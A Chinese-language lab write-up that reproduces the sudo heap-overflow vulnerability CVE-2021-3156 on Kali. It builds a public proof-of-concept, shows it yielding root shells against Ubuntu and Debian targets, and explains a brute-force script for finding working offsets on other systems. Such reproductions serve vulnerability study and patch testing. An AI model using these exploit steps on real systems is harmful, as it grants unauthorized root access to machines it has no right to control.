# 测试环境

该漏洞最开始给出的exp是针对Ubuntu18和20版本以及Debian10版本的，于是我们直接在Debian系的kali（19版本）上测一下

用到sudo的版本有以下：

    
    
    Sudo 版本 1.8.31p1
    Sudoers 策略插件版本 1.8.31p1
    Sudoers 文件语法版本 46
    Sudoers I/O plugin version 1.8.31p1

# 测试准备

首先下载gayhub上的exp套餐（  
https://github.com/blasty/CVE-2021-3156）

看一下套餐内容

    
    
    zeeker@kali:~/CVE-2021-3156$ ls -l
    总用量 256
    -rwxr-xr-x 1 zeeker root     1993 5月  15 00:35 brute.sh
    -rw-r--r-- 1 zeeker root     4615 5月  15 00:35 hax.c
    -rw-r--r-- 1 zeeker root      454 5月  15 00:35 lib.c
    drwxr-xr-x 2 zeeker zeeker   4096 5月  15 00:38 libnss_X
    -rw-r--r-- 1 zeeker root      273 5月  15 00:35 Makefile
    drwxr-xr-x 2 zeeker root     4096 5月  15 00:35 out
    -rw-r--r-- 1 zeeker root   186794 5月  15 00:35 possib
    -rw-r--r-- 1 zeeker root     1242 5月  15 00:35 README.md
    -rw-r--r-- 1 zeeker root    19032 5月  15 00:35 success.txt
    -rwxr-xr-x 1 zeeker zeeker  17264 5月  15 00:38 sudo-hax-me-a-sandwich

make

    
    
    zeeker@kali:~/CVE-2021-3156$ make
    rm -rf libnss_X
    mkdir libnss_X
    gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
    gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
    zeeker@kali:~/CVE-2021-3156$ 

# 漏洞复现

跑一下今天的主角

    
    
    zeeker@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
      usage: ./sudo-hax-me-a-sandwich <target>
    
      available targets:
      ------------------------------------------------------------        0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
        1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
        2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
      ------------------------------------------------------------    
      manual mode:
        ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

按照提示直接试一下选项 2

成功，代码为

    
    
    zeeker@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 2
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
    using target: Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 ['/usr/bin/sudoedit'] (64, 49, 60, 214)
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    # id
    uid=0(root) gid=0(root) groups=0(root),998(zeeker)
    # 

然后尝试一下其他两个选项也能利用成功

    
    
    zeeker@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
    using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    # id
    uid=0(root) gid=0(root) groups=0(root),998(zeeker)
    # 
    zeeker@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 1
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
    using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    # id
    uid=0(root) gid=0(root) groups=0(root),998(zeeker)
    # 
    zeeker@kali:~/CVE-2021-3156$ 

附上下图一张

![image-20210515003924520.png](https://image.3001.net/images/20210527/1622047264_60ae7a2000fb3e8feff48.png!small)

PS：

爆破部分用法

没装parallel的就需要安装，安装命令有以下

    
    
    wget https://ftpmirror.gnu.org/parallel/parallel-latest.tar.bz2
    tar -jxvf parallel-20210422.tar.bz2
    cd parallel-20210422
    ./configure
    make && sudo make install

如果脚本是从windows上拷过来的，可能还会遇到如下问题

    
    
    -bash: ./brute.sh: /bin/bash^M: 解释器错误: 没有那个文件或目录

这种是脚本的换行符格式问题，一句话解决

    
    
    sed -i 's/\r$//' brute.sh

然后就是跑脚本爆破出利用点

    
    
    make brute
    ./brute.sh 90 120 50 70 150 300

第二行的五个参数分别对应 <smash_start> <smash_end> <null_start> <null_end> <lc_start>
<lc_end>，可以自己修改

脚本会尝试爆破出不同的 <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
参数值，如果有可能成功地值会保存到当前目录下的 success.txt 文件中，然后手工进行尝试

查看当前目录下生成的sucess.txt文件，里面记录了爆破过程中可能是利用点的数据，其中一条样例如下：

    
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
    using target: Manual ['/usr/bin/sudoedit'] (51, 52, 70, 240)
    ** pray for your rootshell.. **
    
    ......
    
    [+] bl1ng bl1ng! We got it!
    ==================

可以看到其中一条值为 51, 52, 70, 240

然后对应执行指令即可提权

    
    
    ./sudo-hax-me-a-sandwich 51 52 70 240

